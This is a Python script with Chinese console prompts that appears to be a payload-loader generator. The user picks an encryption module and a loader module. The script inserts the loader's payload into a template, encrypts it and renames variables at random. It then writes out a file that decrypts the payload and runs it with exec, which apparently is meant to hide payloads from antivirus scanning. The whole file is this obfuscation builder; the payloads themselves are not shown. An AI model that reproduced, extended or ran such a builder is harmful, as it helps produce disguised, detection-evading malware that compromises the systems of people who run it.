import os
import random
import string
import pkgutil
import importlib
encoder_path = 'encoder'
loader_path = "loader"
encoder_dict = {}
loader_dict = {}
choice = []
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def GetAllEnc():
    for _,module_name, _ in pkgutil.iter_modules([encoder_path]):
        exec(f"from {encoder_path} import {module_name}")
        name = eval(module_name+".name")
        module = importlib.import_module(f'{encoder_path}.{module_name}')
        encoder_dict[name] = module
def GetAllLdr():
    for _,module_name, _ in pkgutil.iter_modules([loader_path]):
        exec(f"from {loader_path} import {module_name}")
        show_name = eval(module_name+".name")
        true_name = module_name[:-3]
        module = importlib.import_module(f'{loader_path}.{module_name}')
        loader_dict[true_name] = [show_name,module]
def ChoiceLdr():
    num = 0
    tmp_dict = {}
    print(bcolors.OKBLUE+"[*] 请从下面选择一个加载器。"+bcolors.ENDC)
    print()
    print(bcolors.OKBLUE+"已有的加载器:"+bcolors.ENDC)
    for k,v in loader_dict.items():
        num += 1
        print(bcolors.OKBLUE+f"    【{num}】"+v[0]+bcolors.ENDC)
        tmp_dict[num] = k
    print()
    c = int(input(bcolors.WARNING+'[?] 请输入:'+bcolors.ENDC))
    kl = tmp_dict.get(c)
    loader = loader_dict[kl][0]
    if loader != None:
        print(bcolors.OKGREEN+"[+] 您选择了: "+str(c)+" ，是 "+loader+" 。"+bcolors.ENDC)
        return kl
    print(bcolors.FAIL+"[!] 您输入了一个无效的引索！"+bcolors.ENDC)
    return False
def ChoiceEnc():
    num = 0
    tmp_dict = {}
    print(bcolors.OKBLUE+"[*] 请从下面选择一个加密算法。"+bcolors.ENDC)
    print(bcolors.OKBLUE+"    支持的算法:"+bcolors.ENDC)
    for k,v in encoder_dict.items():
        num += 1
        print(bcolors.OKBLUE+f"    【{num}】"+k+bcolors.ENDC)
        tmp_dict[num] = k
    c = int(input(bcolors.WARNING+'[?] 请输入:'+bcolors.ENDC))
    encer = tmp_dict.get(c)
    if encer != None:
        print(bcolors.OKGREEN+"[+] 您选择了:"+str(c)+"，是"+encer+"。"+bcolors.ENDC)
        return encer
    print(bcolors.FAIL+"[!] 您输入了一个无效的引索！"+bcolors.ENDC)
    return False
def init():
    if os.name == 'posix': clscom = 'clear'
    if os.name == 'nt': clscom = 'cls'
    clear = lambda : os.system(clscom)
    clear()
    GetAllEnc()
    GetAllLdr()
def GenVar(length=8):
    letters = string.ascii_lowercase
    variable_name = random.choice(letters)
    variable_name += ''.join(random.choice(letters + string.digits) for _ in range(length - 1))
    return variable_name
def main():
    choice.append(ChoiceEnc())
    choice.append(ChoiceLdr())
    payload = loader_dict[choice[1]][1].main()
    with open('template\\Loader\\'+choice[1]+'.py','r') as ltp:
        ltpc = ltp.read()
    ltpc = ltpc.replace("{!payload!}",str(payload))+'\n'
    key = encoder_dict[choice[0]].genkey()
    en_ltpc = encoder_dict[choice[0]].main(ltpc.encode('UTF-8'),key)
    ltpc_var = GenVar()
    en_ltpc_code = ltpc_var+' = '+str(en_ltpc)
    en_need = encoder_dict[choice[0]].need
    with open('template\\Encoder\\'+choice[0]+'.py','r') as etp:
        etpc = etp.read()
    decode_var = GenVar()
    etpc = etpc.replace("{!decode_var!}",decode_var)+'\n'
    run = 'exec('+decode_var+'('+ltpc_var+','+str(key)+'))\nmain()'
    code = en_need + en_ltpc_code + '\n' + etpc + run
    save = input(bcolors.WARNING+"[?] 请输入保存路径:"+bcolors.ENDC)
    with open(save,'w') as s:
        s.write(code)
    print(bcolors.OKGREEN+"[+] 生成成功！保存在:"+save+bcolors.ENDC)
    input('按回车键继续...')
if __name__ == '__main__':
    init()
    main()
